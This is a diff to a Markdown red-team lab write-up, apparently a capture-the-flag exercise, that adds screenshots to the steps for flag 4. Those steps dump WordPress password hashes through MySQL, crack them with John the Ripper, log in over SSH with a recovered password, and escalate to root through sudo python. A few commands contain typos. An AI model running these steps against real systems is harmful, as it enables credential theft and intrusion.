@@ -130,11 +130,20 @@ The Red Team was able to penetrate Target 1 and retrieve the following confide
 		- Exploit Used
 			- While still being logged in via sql I described the table wp_users
 			- describe wp_users;
+			
+			![flag4a](https://user-images.githubusercontent.com/92223941/167326218-649f1311-d533-4d41-94cf-0a59de663b8f.PNG)
+
 			- I then formatted the username and passwords being separated by a colon sign.
 			- select concat_ws(‘:’, user_login, user_pass) from wp_users;
+			
+			![flag4b](https://user-images.githubusercontent.com/92223941/167326266-a4244f27-c934-4392-a83d-3bceb188f5fc.PNG)
+
 			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
 			- select concat_ws(‘:’, user_login, user_pass) from wp_users into outfile ‘var/www/wp_hashes.txt’;
 			- cat wp_hashes.txt
+			
+			![flag4c](https://user-images.githubusercontent.com/92223941/167326342-c94b3228-30c0-490d-ac96-d6ffe6bce7a4.PNG)
+
 			- I copied wp_hashes.txt file and exited Michael’s computer and pasted the file on www directory on my pc
 			- “copied username and passwords”
 			- Exit
@@ -143,13 +152,36 @@ The Red Team was able to penetrate Target 1 and retrieve the following confide
 			- touch wp_hashes.txt
 			- nano wps_hashes.txt
 			- “pasted username and passwords”
+			
+			![flag4e](https://user-images.githubusercontent.com/92223941/167326520-ddb2f5c9-ef58-4b7e-8621-23d91c5d8a9c.PNG)
+			![flag4g](https://user-images.githubusercontent.com/92223941/167326561-11b6f7e1-e127-4d27-80dd-1e0756f9b8cb.PNG)
+			![flag4h](https://user-images.githubusercontent.com/92223941/167326592-35ae610a-cb64-4788-894d-779be493d6c2.PNG)
+			![flag4j](https://user-images.githubusercontent.com/92223941/167326622-6dafcd8d-d7b2-4d66-8149-d154a25344b5.PNG)
+
+
+
+
 			- I ran john the ripper to brute force the password with the usernames and found the password for steven
 			- John wp_hashes.txt
+			
+			![flag4k](https://user-images.githubusercontent.com/92223941/167326692-5a80a0a4-9f7f-48ba-93eb-4317fdc6f447.PNG)
+
 			- I logged into Steven via ssh 
 			- ssh steven password:pink84
+			
+			![flag4l](https://user-images.githubusercontent.com/92223941/167326728-ac651bee-27af-432e-85f1-bd430ec5381e.PNG)
+
 			- I ran a python command to login via root
 			- sudo python -c ‘import pty:pty.spawn(“/bin/bash”)’
+			
+			![flag4n](https://user-images.githubusercontent.com/92223941/167326764-62a5208a-dbfd-407a-b146-ca8bd3f9df23.PNG)
+
 			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
 			- cd /root
 			- ls
 			- cat flag4.txt
+			
+			![flag4o](https://user-images.githubusercontent.com/92223941/167326928-e79bc557-63bc-4bbe-90d8-e3b6df552cb3.PNG)
+			![flag4p](https://user-images.githubusercontent.com/92223941/167326947-95624749-bb2b-4123-b638-34adb95afa9b.PNG)
+
+
